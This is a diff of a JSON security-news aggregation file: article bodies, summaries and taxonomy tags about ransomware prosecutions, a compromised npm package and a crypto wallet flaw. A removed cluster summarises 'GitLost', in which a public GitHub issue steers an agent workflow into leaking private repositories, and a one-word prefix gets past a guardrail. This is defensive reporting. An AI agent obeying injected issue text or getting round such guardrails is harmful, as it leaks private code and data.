+        "full_body": "Sinisa Markovic , Managing Editor, Help Net Security July 13, 2026 Share Ransomware negotiator who betrayed clients sentenced to 70 months in prison A former ransomware negotiator at incident response firm DigitalMint has been sentenced to 70 months in prison after admitting he shared confidential client information with the BlackCat ransomware group and later helped carry out ransomware attacks. Prosecutors say Angelo Martino, 41, abused his role at DigitalMint beginning in April 2023 by providing BlackCat operators with sensitive information gathered during ransomware negotiations . The information included victims’ negotiating positions, insurance policy limits, and internal assessments, helping the group maximize ransom demands against five organizations. “He was hired to help victims in a moment of crisis,” said U.S. Attorney Jason A. Reding Quiñones for the Southern District of Florida. “Instead, Martino betrayed them, fed their confidential negotiating positions to ransomware criminals, and helped squeeze them for more money.” Alongside Martino, Ryan Goldberg of Georgia and Kevin Martin of Texas were also involved in the scheme . All three worked in the cybersecurity industry and used their positions and expertise to support the criminal activity. Martino and Martin worked as ransomware negotiators at DigitalMint, while Goldberg was an incident response manager at Sygnia Cybersecurity Services. In one case, the conspirators received about $1.2 million in Bitcoin after a victim paid a ransom. The Justice Department said the money was divided among the participants and later laundered through cryptocurrency transactions designed to hide its origin. Federal investigators also seized more than $10 million in cryptocurrency and other assets linked to Martino. The forfeited property included luxury vehicles, a fishing boat, and a food truck. A restitution hearing will determine how much he must repay victims. Martino pleaded guilty on April 14 to a one-count information charging him with conspiring to interfere with interstate commerce through extortion. On May 1, his co-conspirators, Kevin Martin and Ryan Goldberg, were each sentenced to 48 months in prison for their roles in the conspiracy. In late 2023, law enforcement disrupted the BlackCat/ALPHV ransomware group by seizing control of its data leak site. More about cybercrime law enforcement ransomware US DoJ USA Share",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "data_breach"
+          ],
+          "actor_attribution": [
+            "BlackCat/ALPHV"
+          ],
+          "affected_industries": [
+            "financial_services",
+            "government"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Help Net Security",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Ransomware negotiator who betrayed clients sentenced to 70 months in prison",
+          "link": "https://www.helpnetsecurity.com/2026/07/13/ransomware-negotiator-blackcat-sentence/",
+          "published": "2026-07-13T12:22:17+00:00",
+          "summary": "A former ransomware negotiator at incident response firm DigitalMint has been sentenced to 70 months in prison after admitting he shared confidential client information with the BlackCat ransomware group and later helped carry out ransomware attacks. Prosecutors say Angelo Martino, 41, abused his role at DigitalMint beginning in April 2023 by providing BlackCat operators with sensitive information gathered during ransomware negotiations. The information included victims’ negotiating positions, insurance policy limits, and internal assessments, helping the … More → The post Ransomware negotiator who betrayed clients sentenced to 70 months in prison appeared first on Help Net Security .",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "data_breach"
+            ],
+            "actor_attribution": [
+              "BlackCat/ALPHV"
+            ],
+            "affected_industries": [
+              "financial_services",
+              "government"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "The Record",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Ryuk operator pleads guilty; Blackcat/AlphV conspirator gets nearly 6-year sentence",
+          "link": "https://therecord.media/ryuk-operator-pleads-guilty-alphv-conspirator-sentenced",
+          "published": "2026-07-10T17:01:00+00:00",
+          "summary": "One man accused of deploying Ryuk ransomware pleaded guilty Wednesday in an Oregon federal court to conspiracy and computer fraud, while another man received a 70-month federal prison sentence in a Florida court for helping the Blackcat/AlphV gang extort multiple victims.",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion"
+            ],
+            "actor_attribution": [
+              "BlackCat/ALPHV"
+            ],
+            "affected_industries": [
+              "government"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "The Hacker News",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Ransomware Negotiator Gets 70 Months in Prison for Aiding BlackCat Attacks",
+          "link": "https://thehackernews.com/2026/07/ransomware-negotiator-gets-70-months-in.html",
+          "published": "2026-07-10T08:10:12+00:00",
+          "summary": "A 41-year-old former ransomware negotiator has been sentenced to nearly six years (i.e., 70 months) in prison in the U.S. for their role in conspiring with the now-defunct BlackCat ransomware operators to extort multiple victims and working with two other cybersecurity professionals to target additional victims in 2023. In a sentencing memorandum, federal prosecutors described Martino as a \"",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion"
+            ],
+            "actor_attribution": [
+              "BlackCat/ALPHV"
+            ],
+            "affected_industries": [
+              "government"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "152995b5e9",
       "priority_score": 8,
       "member_count": 1,
@@ -6693,8 +7264,8 @@
         "link": "https://www.blackhillsinfosec.com/the-goldilocks-zone/",
         "published": "2026-07-08T14:00:00+00:00",
         "summary": "We're all petrified about missing a critical event or misclassifying an alert, but when we're talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It's easy to get caught up with one alert because it feels \"too hot\" or maybe not spend enough time looking into something that initially seems \"too cold.\" The post Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage appeared first on Black Hills Information Security, Inc. .",
-        "full_body": "8 Jul 2026 Active SOC , Blue Team , DFIR , Hayden Covington , Incident Response , Informational Alert Traige , Detection Logic , Infosec for Beginners , InfoSec Survival Guide , Orange Book , SIEM Finding the “Goldilocks” Zone: A Practical Approach to Alert Triage | Hayden Covington This article was originally published in the InfoSec Survival Guide: Orange Book — Incident Response. Read it free online HERE , or grab it on the Spearphish General Store (free digital download or a $1.25 physical copy, your call). Security engineers, analysts, and incident responders all have one thing in common, and I’m not talking about 3 AM phone calls concerning incidents. I’m talking about triage: that challenging moment of urgency when assessments must be made and classifications communicated—for the right things to be decided on to prevent the bad stuff from happening. We’re all petrified about missing a critical event or misclassifying an alert, but when we’re talking about incident response (IR), there are often hundreds if not thousands of alerts to parse through. It’s easy to get caught up with one alert because it feels “too hot” or maybe not spend enough time looking into something that initially seems “too cold.” I’ll provide some tips, tricks, and techniques to help find that “Goldilocks Zone” of spending just the right amount of time on an alert, allowing you to quickly triage and move on to the next. Consider the Severities The simplest way to triage events is to consider the severity of the alert. Initially, most Low-severity alerts should be entirely ignored. On any given case, time is limited, and the value return of going over hundreds of Low alerts is not even remotely comparable to that of reviewing higher priority findings. Mediums will often be the bulk of your alert volume, with these being right in that uncomfortable middle of the “Probably nothing” of Lows and the “Definitely something” of Highs or Criticals. To move quickly on an IR engagement, I categorically relegate the Medium alerts to a later time on that case; and almost every time, the High and Critical alerts tell the real story, giving concrete direction on how to search the Mediums and Lows in a more targeted fashion. Anomalies Against the Baseline One of the most surefire ways to quickly classify an event as a true or false positive is to compare the activity against the normal baseline: “Does this happen regularly on this host,” “in this environment,” or maybe even “in any of the environments I can observe?” While a certain execution or activity on one host may appear anomalous, once you discover that it happens on a number of hosts across multiple environments, either you’ve just found your answer, or you’ve discovered a much bigger issue… Actions on Objective One of my favorite tactics is considering “actions on objective.” If an attacker gains access to a host, they have an end goal in mind. Whether that goal is financially motivated, a desire to steal data, or even if they just want to observe activity in the environment—they broke in for a purpose. Someone isn’t going to go through the effort of breaking into your house just to stand around. For the attacker to achieve their goals, some form of activity must occur to get them there. That often looks like exfiltration or lateral movement. All that to say, if the activity you’re looking at never actually goes anywhere, steals anything, or tries to override anything else, chances are it may not actually be evil, because it certainly isn’t doing the attacker much good. Detection Intent Probably the most novel (and somewhat controversial) approach I’ve come across is considering detection intent first and foremost. This approach requires you to understand exactly what it is that the rule that fired is looking for, and to look for that one specific thing only, ignoring anything else you may see in the periphery. That idea may sound counterintuitive but think about it: Threat detections are often straightfor",
-        "fetch_status": "ok",
+        "full_body": "",
+        "fetch_status": "not_attempted",
         "taxonomy": {
           "threat_categories": [],
           "actor_attribution": [],
@@ -6743,22 +7314,18 @@
       "cluster_id": "b35394b0f7",
       "priority_score": 8,
       "member_count": 2,
-      "corroborating_source_count": 1,
+      "corroborating_source_count": 2,
       "strong_signals": [
         "npm"
       ],
       "taxonomy": {
         "threat_categories": [
           "credential_theft",
-          "supply_chain"
+          "web_shell_backdoor"
         ],
         "actor_attribution": [],
-        "affected_industries": [
-          "financial_services"
-        ],
+        "affected_industries": [],
         "affected_products": [
-          "Apple iOS/macOS",
-          "GitHub",
           "npm"
         ],
         "tools_used": [],
@@ -6780,20 +7347,16 @@
         "link": "https://thehackernews.com/2026/07/compromised-jscrambler-8140-npm-release.html",
         "published": "2026-07-11T17:59:26+00:00",
         "summary": "The jscrambler npm package was compromised, and simply installing its 8.14.0 release runs an infostealer on your machine. Published on July 11, 2026, the malicious version carries a preinstall hook that drops and executes a native binary, one build each for Windows, macOS, and Linux. Socket flagged the release six minutes after it was published. If you or one of your",
-        "full_body": "Compromised jscrambler 8.14.0 npm Release Drops Rust Infostealer During Install  Swati Khandelwal  Jul 11, 2026 Software Supply Chain / Malware The jscrambler npm package was compromised, and simply installing its 8.14.0 release runs an infostealer on your machine. Published on July 11, 2026, the malicious version carries a preinstall hook that drops and executes a native binary, one build each for Windows, macOS, and Linux. Socket flagged the release six minutes after it was published . If you or one of your build systems pulled it in that window, the payload has already run with whatever access your install process had. None of this is in the prior release, 8.13.0. The package diff shows two new files under dist/: setup.js, a small loader, and intro.js. Despite the name, intro.js is not JavaScript but a roughly 7.8MB container packing three gzip-compressed native binaries, one each for Linux, Windows, and macOS. On install, setup.js picks the binary for the host operating system, writes it under a random name in the system temp directory, marks it executable, and launches it detached with its output hidden. The added files are in the published package, but nowhere in jscrambler's public source. StepSecurity and SafeDep both pulled and analyzed the release, and both report no matching commit, tag, or pull request for 8.14.0 in the GitHub repository. Its latest tag is still 8.13.0. The version was pushed straight to npm under a legitimate maintainer account, bypassing the project's normal release flow. That points to a compromised npm account or build pipeline. Which of the two has not been established. The payload is a Rust infostealer, built for all three platforms, that sweeps a developer machine for secrets and ships them to a drop server over TLS, according to Socket's updated analysis and a statement to The Hacker News. The target list is broad and aimed at developers: cloud credentials from AWS, Azure, and Google Cloud, including the metadata endpoints CI runners use; cryptocurrency wallets and seed phrases from MetaMask, Phantom, and Exodus; the Bitwarden password manager vault; browser-stored passwords and cookies; and Discord, Slack, Telegram, and Steam sessions. It also goes after something newer: the config files for AI coding tools, including Claude Desktop, Cursor, Windsurf, VS Code, and Zed, where API keys and Model Context Protocol server credentials tend to sit. The binaries do more than steal. On Linux, the payload links the kernel's BPF library and can load an eBPF program straight into the kernel from memory. That is a foothold in the kernel, not the userspace file access that the rest of the stealer relies on. StepSecurity and SafeDep both flagged the capability, though what the eBPF does is still being pulled apart. The Windows and macOS builds add anti-debugging checks, and the stealer wires in persistence to survive a reboot: a hidden Windows scheduled task set to relaunch every minute, and a macOS LaunchAgent that reloads on login. Its command-and-control details stay encrypted in the binary and never surfaced in static analysis. StepSecurity's runtime monitoring caught the dropped binary reaching out to two hard-coded IP addresses and to Tor infrastructure, the first network indicators published for the campaign. jscrambler is a build-time tool, installed as a development dependency or run from CI. Those environments hold what the stealer collects: cloud keys, deploy tokens, and source code that a build or CI process can reach. Source: Step Security The package sees about 15,800 downloads a week, and how many pulled the compromised version is not yet known. That is a far smaller footprint than the packages hit in the big npm compromises of the past year, which pull billions of downloads a week between them. For a stealer aimed at build machines, though, reach was never the point. The access is. The Shai-Hulud worm ran from an install hook to steal tokens and spread through hundreds of packages that ",
-        "fetch_status": "ok",
+        "full_body": "",
+        "fetch_status": "not_attempted",
         "taxonomy": {
           "threat_categories": [
-            "supply_chain",
             "credential_theft"
           ],
           "actor_attribution": [],
-          "affected_industries": [
-            "financial_services"
-          ],
+          "affected_industries": [],
           "affected_products": [
-            "npm",
-            "Apple iOS/macOS"
+            "npm"
           ],
           "tools_used": [],
           "cve_ids": [],
@@ -6803,15 +7366,14 @@
           "confidence_tier": "tier_4_news",
           "role_map": {
             "npm": "target",
-            "Apple iOS/macOS": "target",
-            "GitHub": "mention"
+            "Apple iOS/macOS": "mention"
           },
           "weak_tags": {
             "products": [
               [
-                "GitHub",
+                "Apple iOS/macOS",
                 "mention",
-                0.28
+                0.26
               ]
             ]
           }
@@ -6827,16 +7389,12 @@
           "summary": "The jscrambler npm package was compromised, and simply installing its 8.14.0 release runs an infostealer on your machine. Published on July 11, 2026, the malicious version carries a preinstall hook that drops and executes a native binary, one build each for Windows, macOS, and Linux. Socket flagged the release six minutes after it was published. If you or one of your",
           "taxonomy": {
             "threat_categories": [
-              "supply_chain",
               "credential_theft"
             ],
             "actor_attribution": [],
-            "affected_industries": [
-              "financial_services"
-            ],
+            "affected_industries": [],
             "affected_products": [
-              "npm",
-              "Apple iOS/macOS"
+              "npm"
             ],
             "tools_used": [],
             "cve_ids": [],
@@ -6846,17 +7404,47 @@
             "confidence_tier": "tier_4_news",
             "role_map": {
               "npm": "target",
-              "Apple iOS/macOS": "target",
-              "GitHub": "mention"
+              "Apple iOS/macOS": "mention"
             },
             "weak_tags": {
               "products": [
                 [
-                  "GitHub",
+                  "Apple iOS/macOS",
                   "mention",
-                  0.28
+                  0.26
                 ]
               ]
+            }
+          }
+        },
+        {
+          "source": "BleepingComputer",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Hackers backdoor Jscrambler npm package with infostealer malware",
+          "link": "https://www.bleepingcomputer.com/news/security/hackers-backdoor-jscrambler-npm-package-with-infostealer-malware/",
+          "published": "2026-07-13T19:44:19+00:00",
+          "summary": "The Jscrambler client-side web security company disclosed that a threat actor published a malicious version of its npm package that has been downloaded almost 1,500 times. [...]",
+          "taxonomy": {
+            "threat_categories": [
+              "credential_theft",
+              "web_shell_backdoor"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "npm"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "npm": "target"
+            },
+            "weak_tags": {
+              "products": []
             }
           }
         }
@@ -6893,8 +7481,8 @@
         "link": "https://thehackernews.com/2026/07/attackers-exploit-ill-bloom.html",
         "published": "2026-07-10T09:00:05+00:00",
         "summary": "Security firm Coinspect has disclosed a crypto wallet flaw it calls Ill Bloom, and attackers are already using it. The flaw is in how some wallet software generated its recovery phrase, the words that control the money. When that phrase is made with weak randomness, an attacker can work it out and take everything it controls. The firm has confirmed one coordinated sweep on May 27",
-        "full_body": "Attackers Exploit 'Ill Bloom' Vulnerability to Drain Over $5 Million From Cryptocurrency Wallets  Swati Khandelwal  Jul 10, 2026 Cryptocurrency / Vulnerability Security firm Coinspect has disclosed a crypto wallet flaw it calls Ill Bloom , and attackers are already using it. The flaw is in how some wallet software generated its recovery phrase, the words that control the money. When that phrase is made with weak randomness, an attacker can work it out and take everything it controls. The firm has confirmed one coordinated sweep on May 27 that drained about $3.1 million from 431 wallets, and it told The Hacker News that a further $2.1 million in USDT was stolen from an exposed wallet afterward, pushing confirmed losses past $5 million. As the firm puts it, \"if funds recently moved without your permission, this vulnerability may be why.\" Most people are probably fine. Coinspect says wallets created on hardware devices are not affected, and most mainstream software wallets are not either. The real risk sits with older or lesser-known wallets, both mobile apps and browser extensions, some dating back to 2018. It has not named the apps involved, so the only way to know is to check. Paste your public wallet address into the free checker at illbloom.org . A match means the recovery phrase should be treated as compromised, so move your funds to a new wallet. What actually broke Every self-custody wallet starts with a recovery phrase, usually 12 or 24 words, also called a seed phrase. Those words are meant to be picked at random from a pool so vast that guessing them is hopeless. The affected wallets were not random enough. Their software used a weak random-number generator when it created the phrase. That shrank the pool of possible phrases from astronomically large to a range that an attacker could search. The firm has not published exactly how small. It says it rebuilt the attack from end to end. It worked through the full set of phrases the weak generator could produce, derived the wallet addresses each one leads to, then checked public blockchain records for the addresses still holding funds. The result is a watchlist of wallets that were born weak, regardless of which app generated them. The theft, by the numbers As of June 30, Coinspect had traced 2,114 exposed addresses with on-chain activity across Bitcoin, Ethereum, Rootstock, Tron, and Polygon. The May 27 sweep drained about $3.1 million from 431 of them. Bitcoin took the worst of it at roughly $2.57 million, and a single Bitcoin address lost more than $1.1 million on its own. The researchers could tell it was one coordinated theft because hundreds of unrelated wallets sent their balances to the same few collection addresses within hours. The $2.1 million theft that followed shows how exposed these wallets stay. Coinspect told The Hacker News the May 27 attacker had already compromised one owner's seed but left that USDT sitting on another chain. Coinspect spotted the money still at risk on June 10 and tried to warn the owner through exchanges the address had used, but the alert did not arrive in time. It could derive the exposed keys itself yet could not move the funds to safety, because \"once a seed phrase is compromised, possessing the key no longer proves legitimate ownership.\" The researchers call the losses a floor, not a ceiling. They told The Hacker News the exposed set has grown since the June 30 snapshot, not because new weak wallets were created but because it keeps finding more vulnerable seed phrases along other generation paths; the checker already reflects the larger list, and the search continues. At its 2022 peak, the same set was worth a reconstructed $12.56 million, though most of that value had already fallen with the market before the May 27 sweep. What to do The checker at illbloom.org compares a public wallet address against Coinspect's list of known-vulnerable wallets. It accepts Bitcoin, Tron, Solana, and Ethereum-style addresses (Ethereum, Polygon",
-        "fetch_status": "ok",
+        "full_body": "",
+        "fetch_status": "not_attempted",
         "taxonomy": {
           "threat_categories": [],
           "actor_attribution": [],
@@ -6942,167 +7530,9 @@
           }
         }
       ]
-    },
-    {
-      "cluster_id": "4b26e94e67",
-      "priority_score": 8,
-      "member_count": 2,
-      "corroborating_source_count": 2,
-      "strong_signals": [
-        "GitHub"
-      ],
-      "taxonomy": {
-        "threat_categories": [
-          "ai_security"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "GitHub"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "incident_report",
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news",
-          "tier_5_chatter"
-        ]
-      },
-      "primary": {
-        "source": "Reddit r/netsec",
-        "cohort": "reddit_practitioner_osint",
-        "title": "GitLost: a public GitHub issue can steer an org's Agentic Workflow into leaking private repo contents, and a one-word prefix (\"Additionally\") bypassed the threat-detection guardrail",
-        "link": "https://www.reddit.com/r/netsec/comments/1upy3gm/gitlost_a_public_github_issue_can_steer_an_orgs/",
-        "published": "2026-07-07T15:16:22+00:00",
-        "summary": "Noma Security published a technique they call GitLost against GitHub Agentic Workflows (the plain-English-Markdown agent feature GitHub put into public preview in February, runnable on Copilot, Claude, Gemini, or Codex). Worth reading because it is a clean demonstration of why \"filter the injection\" does not hold as a defense. The setup. Workflows are read-only by default, but an org can hand one a personal access token with read access across its repos, private ones included, to give the agent cross-repo context. That grant is the whole vulnerability. Nothing else about the attack requires access: no stolen creds, no write access to anything private, no touching a server. The attacker just opens a normal-looking issue on a public repo. The technique is indirect prompt injection, which is not new, but the interesting part is what the agent controls. Noma's Sasi Levi frames the distinction as earlier injection being about manipulating what an agent says, versus GitLost being about what ",
-        "full_body": "",
-        "fetch_status": "fetch_failed:HTTPError",
-        "taxonomy": {
-          "threat_categories": [
-            "ai_security"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "GitHub"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_5_chatter",
-          "role_map": {
-            "GitHub": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Reddit r/netsec",
-          "cohort": "reddit_practitioner_osint",
-          "title": "GitLost: a public GitHub issue can steer an org's Agentic Workflow into leaking private repo contents, and a one-word prefix (\"Additionally\") bypassed the threat-detection guardrail",
-          "link": "https://www.reddit.com/r/netsec/comments/1upy3gm/gitlost_a_public_github_issue_can_steer_an_orgs/",
-          "published": "2026-07-07T15:16:22+00:00",
-          "summary": "Noma Security published a technique they call GitLost against GitHub Agentic Workflows (the plain-English-Markdown agent feature GitHub put into public preview in February, runnable on Copilot, Claude, Gemini, or Codex). Worth reading because it is a clean demonstration of why \"filter the injection\" does not hold as a defense. The setup. Workflows are read-only by default, but an org can hand one a personal access token with read access across its repos, private ones included, to give the agent cross-repo context. That grant is the whole vulnerability. Nothing else about the attack requires access: no stolen creds, no write access to anything private, no touching a server. The attacker just opens a normal-looking issue on a public repo. The technique is indirect prompt injection, which is not new, but the interesting part is what the agent controls. Noma's Sasi Levi frames the distinction as earlier injection being about manipulating what an agent says, versus GitLost being about what ",
-          "taxonomy": {
-            "threat_categories": [
-              "ai_security"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "GitHub"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_5_chatter",
-            "role_map": {
-              "GitHub": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "The Hacker News",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Dormant GitHub Accounts Help Attackers Blend In While Mapping Corporate Orgs",
-          "link": "https://thehackernews.com/2026/07/dormant-github-accounts-help-attackers.html",
-          "published": "2026-07-09T18:38:49+00:00",
-          "summary": "Datadog Security Labs is warning of \"several overlapping campaigns\" that are systematically enumerating corporate GitHub organizations, repositories, and user accounts through the GitHub API. \"Operators rely on automated scraping tooling with custom or legitimate-sounding user agents, leveraging GitHub 'ghost' accounts that are often years old, or compromised OAuth tokens and personal",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "GitHub"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "GitHub": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
     }
   ],
   "affinity_groups": [
-    {
-      "label": "active exploitation targeting Apple iOS/macOS",
-      "anchor_signal": "Apple iOS/macOS",
-      "theme_key": "apple-ios-macos",
-      "dominant_features": {
-        "threat_categories": [
-          "active_exploitation"
-        ],
-        "affected_products": [
-          "Apple iOS/macOS"
-        ]
-      },
-      "cluster_count": 4,
-      "article_count": 7,
-      "cohesion": 0.2,
-      "shared_strong_signals": [
-        "Apple iOS/macOS"
-      ],
-      "member_cves": [],
-      "also_targets": [],
-      "cluster_ids": [
-        "598aa947b4",
-        "9d6bdd5305",
-        "605f13c77e",
-        "b35394b0f7"
-      ],
-      "links": [
-        "https://www.rapid7.com/blog/post/pt-weekly-metasploit-update-exploits-for-flowiseai-csv-agent-and-macos-package-kit",
-        "https://www.bleepingcomputer.com/news/security/new-crashstealer-malware-poses-as-apple-crash-reporting-tool/",
-        "https://thehackernews.com/2026/07/crashstealer-macos-malware-uses.html",
-        "https://www.huntress.com/blog/patch-management-strategy",
-        "https://www.securityweek.com/zimbra-patches-critical-code-execution-vulnerability/",
-        "https://thehackernews.com/2026/07/compromised-jscrambler-8140-npm-release.html"
-      ]
-    },
     {
       "label": "Microsoft 365 active exploitation",
       "anchor_signal": "Microsoft 365",
@@ -7151,6 +7581,47 @@
       ]
     },
     {
+      "label": "CVE-2026-56291 exploitation activity",
+      "anchor_signal": "CVE-2026-56291",
+      "theme_key": "cve-2026-56291",
+      "dominant_features": {
+        "threat_categories": [
+          "zero_day",
+          "active_exploitation"
+        ],
+        "affected_industries": [
+          "government"
+        ],
+        "cve_ids": [
+          "CVE-2026-48939",
+          "CVE-2026-56291"
+        ],
+        "urgency_signals": [
+          "actively_exploited",
+          "zero_day",
+          "preauth_unauth"
+        ]
+      },
+      "cluster_count": 3,
+      "article_count": 3,
+      "cohesion": 0.432,
+      "shared_strong_signals": [
+        "CVE-2026-56291"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "08882287bf",
+        "3e3af8b34c",
+        "b5c5a1216b"
+      ],
+      "links": [
+        "https://thehackernews.com/2026/07/icagenda-and-balbooa-forms-joomla-flaws.html",
+        "https://www.bleepingcomputer.com/news/security/cisa-warns-of-actively-exploited-rce-flaws-in-joomla-extensions/",
+        "https://www.securityweek.com/organizations-warned-of-exploited-joomla-extension-vulnerabilities/"
+      ]
+    },
+    {
       "label": "CVE-2026-48939 exploitation activity",
       "anchor_signal": "CVE-2026-48939",
       "theme_key": "cve-2026-48939",
@@ -7192,44 +7663,36 @@
       ]
     },
     {
-      "label": "CVE-2026-56291 exploitation activity",
-      "anchor_signal": "CVE-2026-56291",
-      "theme_key": "cve-2026-56291",
+      "label": "active exploitation targeting Apple iOS/macOS",
+      "anchor_signal": "Apple iOS/macOS",
+      "theme_key": "apple-ios-macos",
       "dominant_features": {
         "threat_categories": [
-          "zero_day",
           "active_exploitation"
         ],
-        "affected_industries": [
-          "government"
-        ],
-        "cve_ids": [
-          "CVE-2026-48939",
-          "CVE-2026-56291"
-        ],
-        "urgency_signals": [
-          "actively_exploited",
-          "zero_day",
-          "preauth_unauth"
+        "affected_products": [
+          "Apple iOS/macOS"
         ]
       },
       "cluster_count": 3,
-      "article_count": 3,
-      "cohesion": 0.432,
+      "article_count": 5,
+      "cohesion": 0.2,
       "shared_strong_signals": [
-        "CVE-2026-56291"
+        "Apple iOS/macOS"
       ],
       "member_cves": [],
       "also_targets": [],
       "cluster_ids": [
-        "08882287bf",
-        "3e3af8b34c",
-        "b5c5a1216b"
+        "598aa947b4",
+        "9d6bdd5305",
+        "605f13c77e"
       ],
       "links": [
-        "https://thehackernews.com/2026/07/icagenda-and-balbooa-forms-joomla-flaws.html",
-        "https://www.bleepingcomputer.com/news/security/cisa-warns-of-actively-exploited-rce-flaws-in-joomla-extensions/",
-        "https://www.securityweek.com/organizations-warned-of-exploited-joomla-extension-vulnerabilities/"
+        "https://www.rapid7.com/blog/post/pt-weekly-metasploit-update-exploits-for-flowiseai-csv-agent-and-macos-package-kit",
+        "https://www.bleepingcomputer.com/news/security/new-crashstealer-malware-poses-as-apple-crash-reporting-tool/",
+        "https://thehackernews.com/2026/07/crashstealer-macos-malware-uses.html",
+        "https://www.huntress.com/blog/patch-management-strategy",
+        "https://www.securityweek.com/zimbra-patches-critical-code-execution-vulnerability/"
       ]
     },
     {
@@ -7377,6 +7840,32 @@
       ]
     },
     {
+      "label": "Citrix vulnerability activity",
+      "anchor_signal": "Citrix",
+      "theme_key": "citrix",
+      "dominant_features": {
+        "affected_products": [
+          "Citrix"
+        ]
+      },
+      "cluster_count": 2,
+      "article_count": 2,
+      "cohesion": 0.2,
+      "shared_strong_signals": [
+        "Citrix"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "aaaf47b0ea",
+        "dfea83e3cb"
+      ],
+      "links": [
+        "https://www.huntress.com/blog/citrixbleed-2-dragonforce-ransomware",
+        "https://www.darkreading.com/vulnerabilities-threats/citrixbleed-ing-again-netscaler-vulnerability-under-attack"
+      ]
+    },
+    {
       "label": "CVE-2018-0171 exploitation activity",
       "anchor_signal": "CVE-2018-0171",
       "theme_key": "cve-2018-0171",
@@ -7411,16 +7900,10 @@
       ]
     },
     {
-      "label": "supply chain targeting npm",
+      "label": "npm vulnerability activity",
       "anchor_signal": "npm",
       "theme_key": "npm",
       "dominant_features": {
-        "threat_categories": [
-          "supply_chain"
-        ],
-        "affected_industries": [
-          "financial_services"
-        ],
         "affected_products": [
           "npm"
         ]
@@ -7439,42 +7922,8 @@
       ],
       "links": [
         "https://research.checkpoint.com/2026/13th-july-threat-intelligence-report/",
-        "https://thehackernews.com/2026/07/compromised-jscrambler-8140-npm-release.html"
-      ]
-    },
-    {
-      "label": "ransomware extortion targeting Palo Alto Networks",
-      "anchor_signal": "Palo Alto Networks",
-      "theme_key": "palo-alto-networks",
-      "dominant_features": {
-        "threat_categories": [
-          "ransomware_extortion",
-          "phishing_social_eng",
-          "data_breach"
-        ],
-        "affected_industries": [
-          "government",
-          "education"
-        ],
-        "affected_products": [
-          "Palo Alto Networks"
-        ]
-      },
-      "cluster_count": 2,
-      "article_count": 2,
-      "cohesion": 0.2,
-      "shared_strong_signals": [
-        "Palo Alto Networks"
-      ],
-      "member_cves": [],
-      "also_targets": [],
-      "cluster_ids": [
-        "c06f0c2fb1",
-        "b5c5a1216b"
-      ],
-      "links": [
-        "https://www.securityweek.com/centers-laboratory-data-breach-affects-540000-individuals/",
-        "https://www.securityweek.com/organizations-warned-of-exploited-joomla-extension-vulnerabilities/"
+        "https://thehackernews.com/2026/07/compromised-jscrambler-8140-npm-release.html",
+        "https://www.bleepingcomputer.com/news/security/hackers-backdoor-jscrambler-npm-package-with-infostealer-malware/"
       ]
     }
   ],
@@ -7616,6 +8065,12 @@
         "weeks_observed": 5
       },
       {
+        "axis": "cve_ids",
+        "value": "CVE-2026-33825",
+        "cluster_id": "8fa37afed0",
+        "weeks_observed": 5
+      },
+      {
         "axis": "actor_attribution",
         "value": "Scattered Spider",
